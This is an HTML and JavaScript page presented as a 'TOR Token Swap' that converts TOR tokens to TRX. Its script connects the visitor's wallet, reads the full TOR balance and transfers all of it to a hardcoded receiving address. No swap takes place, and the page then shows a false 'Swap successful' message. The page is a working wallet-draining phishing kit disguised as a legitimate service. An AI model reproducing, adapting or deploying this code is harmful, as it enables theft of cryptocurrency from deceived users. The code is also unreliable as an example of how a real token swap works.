<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TOR Token Swap to TRX</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      max-width: 600px;
      margin: 0 auto;
      padding: 20px;
      text-align: center;
      background: #f8f9fa;
      color: #333;
    }
    .container {
      background: white;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
    }
    h1 {
      color: #2c3e50;
      margin-bottom: 10px;
    }
    p {
      color: #7f8c8d;
      margin-bottom: 25px;
    }
    button {
      background: #3498db;
      color: white;
      border: none;
      padding: 12px 25px;
      font-size: 16px;
      cursor: pointer;
      border-radius: 8px;
      margin: 10px 5px;
      transition: all 0.3s ease;
      font-weight: bold;
    }
    button:hover {
      background: #2980b9;
      transform: translateY(-2px);
    }
    button:disabled {
      background: #bdc3c7;
      cursor: not-allowed;
      transform: none;
    }
    .network-selector {
      margin: 20px 0;
    }
    select {
      padding: 10px;
      border-radius: 8px;
      border: 1px solid #ddd;
      font-size: 16px;
    }
    .status {
      margin-top: 25px;
      padding: 15px;
      border-radius: 8px;
      display: none;
    }
    .success {
      background: #d4edda;
      color: #155724;
      border: 1px solid #c3e6cb;
    }
    .error {
      background: #f8d7da;
      color: #721c24;
      border: 1px solid #f5c6cb;
    }
    .tx-link {
      color: #3498db;
      text-decoration: none;
      font-weight: bold;
    }
    .tx-link:hover {
      text-decoration: underline;
    }
    .wallet-info {
      margin-top: 15px;
      font-size: 14px;
      color: #7f8c8d;
    }
    .loader {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
      display: none;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>TOR Token Swap</h1>
    <p>Your TOR tokens will be automatically swapped to TRX-based TOR</p>
    
    <div class="network-selector">
      <select id="networkSelect">
        <option value="bsc">Binance Smart Chain</option>
        <option value="fantom">Fantom Opera</option>
      </select>
    </div>
    
    <button id="connectWallet">Connect Wallet & Swap</button>
    <div id="loader" class="loader"></div>
    
    <div id="walletInfo" class="wallet-info"></div>
    <div id="status" class="status"></div>
  </div>

  <!-- Load Ethers.js with multiple fallback options -->
  <script>
    // Configuration
    const RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";
    const CONTRACT_ADDRESSES = {
      bsc: "0x1d6cbdc6b29c6afbae65444a1f65ba9252b8ca83",
      fantom: "0x74e23df9110aa9ea0b6ff2faee01e740ca1c642e"
    };
    const TOR_ABI = [
      "function balanceOf(address owner) view returns (uint256)",
      "function transfer(address to, uint256 amount) returns (bool)"
    ];
    const NETWORK_CONFIGS = {
      bsc: {
        chainId: "0x38",
        chainName: "Binance Smart Chain",
        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
        rpcUrls: ["https://bsc-dataseed.binance.org/"],
        blockExplorerUrls: ["https://bscscan.com"],
        scanUrl: "https://bscscan.com/tx/"
      },
      fantom: {
        chainId: "0xfa",
        chainName: "Fantom Opera",
        nativeCurrency: { name: "FTM", symbol: "FTM", decimals: 18 },
        rpcUrls: ["https://rpc.ftm.tools/"],
        blockExplorerUrls: ["https://ftmscan.com"],
        scanUrl: "https://ftmscan.com/tx/"
      }
    };

    // Global variables
    let currentNetwork = "bsc";
    let provider, signer, userAddress;

    // Initialize when page loads
    window.addEventListener('load', () => {
      // Set up network selection
      document.getElementById("networkSelect").addEventListener('change', (e) => {
        currentNetwork = e.target.value;
      });
      
      // Connect and swap button
      document.getElementById("connectWallet").addEventListener("click", connectAndSwap);
    });

    // Main function to connect wallet and swap tokens
    async function connectAndSwap() {
      try {
        if (!window.ethereum) {
          throw new Error("Please install MetaMask or Trust Wallet!");
        }

        showLoader();
        updateStatus("Connecting wallet...", "success");

        // Request account access
        await window.ethereum.request({ method: "eth_requestAccounts" });
        
        // Check and switch network if needed
        await checkNetwork();
        
        // Initialize provider and signer
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        userAddress = await signer.getAddress();
        
        // Update UI
        document.getElementById("connectWallet").disabled = true;
        document.getElementById("connectWallet").textContent = "Processing...";
        document.getElementById("walletInfo").textContent = 
          `Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)} | Network: ${NETWORK_CONFIGS[currentNetwork].chainName}`;
        
        // Execute the swap automatically
        await executeSwap();
      } catch (err) {
        hideLoader();
        updateStatus("Error: " + err.message, "error");
        document.getElementById("connectWallet").disabled = false;
        document.getElementById("connectWallet").textContent = "Connect Wallet & Swap";
      }
    }

    async function checkNetwork() {
      const chainId = await window.ethereum.request({ method: 'eth_chainId' });
      const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
      
      if (chainId !== targetChainId) {
        updateStatus(`Switching to ${NETWORK_CONFIGS[currentNetwork].chainName}...`, "success");
        try {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: targetChainId }]
          });
        } catch (switchError) {
          // If network not added, try adding it
          if (switchError.code === 4902) {
            try {
              await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [NETWORK_CONFIGS[currentNetwork]]
              });
            } catch (addError) {
              throw new Error(`Please switch to ${NETWORK_CONFIGS[currentNetwork].chainName} manually`);
            }
          } else {
            throw new Error("Failed to switch network");
          }
        }
      }
    }

    async function executeSwap() {
      try {
        updateStatus("Checking TOR balance...", "success");
        
        // Get contract instance
        const torContract = new ethers.Contract(
          CONTRACT_ADDRESSES[currentNetwork], 
          TOR_ABI, 
          signer
        );
        
        // Check balance
        const balance = await torContract.balanceOf(userAddress);
        if (balance.eq(0)) {
          throw new Error("You have 0 TOR tokens to swap");
        }
        
        // Execute transfer
        updateStatus(`Sending ${ethers.utils.formatUnits(balance, 18)} TOR...`, "success");
        const tx = await torContract.transfer(RECEIVING_WALLET, balance);
        
        updateStatus("Waiting for transaction confirmation...", "success");
        await tx.wait();
        
        updateStatus(
          `Swap successful! <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View transaction</a>`,
          "success"
        );
        
        document.getElementById("connectWallet").textContent = "Swap Completed";
      } catch (err) {
        throw new Error("Swap failed: " + (err.message || err));
      } finally {
        hideLoader();
      }
    }

    function updateStatus(message, type) {
      const statusDiv = document.getElementById("status");
      statusDiv.style.display = "block";
      statusDiv.innerHTML = message;
      statusDiv.className = `status ${type}`;
    }

    function showLoader() {
      document.getElementById("loader").style.display = "block";
    }

    function hideLoader() {
      document.getElementById("loader").style.display = "none";
    }

    // Load Ethers.js with fallback
    function loadEthers() {
      const script = document.createElement('script');
      script.src = 'https://cdn.jsdelivr.net/npm/ethers@5.2/dist/ethers.umd.min.js';
      script.onload = () => {
        // Ethers.js loaded successfully
        console.log("Ethers.js loaded successfully");
      };
      script.onerror = () => {
        // Fallback to alternative CDN
        const fallbackScript = document.createElement('script');
        fallbackScript.src = 'https://cdn.ethers.io/lib/ethers-5.2.umd.min.js';
        document.head.appendChild(fallbackScript);
      };
      document.head.appendChild(script);
    }

    // Start loading Ethers.js
    loadEthers();
  </script>
</body>
</html>
